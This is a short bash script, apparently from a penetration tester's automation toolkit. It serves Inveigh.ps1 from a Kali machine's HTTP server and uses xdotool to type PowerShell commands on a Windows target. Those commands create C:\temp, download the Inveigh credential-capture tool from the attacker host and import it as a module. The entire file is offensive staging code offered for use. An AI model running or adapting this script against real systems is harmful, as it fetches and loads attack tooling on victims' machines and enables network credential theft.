#!/bin/bash

: '
ps: Upload Inveigh.ps1 and import module
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Port"

PORT=${form_data["Port"]}

cd ${SCRIPTS_DIR}/windows/inveight/.files
python3 -m http.server ${PORT} &
HTTP_PID=$!

TMP_FOLDER="C:\temp"

paste_command "New-Item -Path \"c:\\\" -Name "temp" -ItemType \"directory\""
xdotool key Return
sleep 0.8

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${PORT}/Inveigh.ps1', '${TMP_FOLDER}\Inveigh.ps1')"
xdotool key Return
sleep 3

paste_command "Import-Module ${TMP_FOLDER}\Inveigh.ps1"
xdotool key Return

sleep 60
kill $HTTP_PID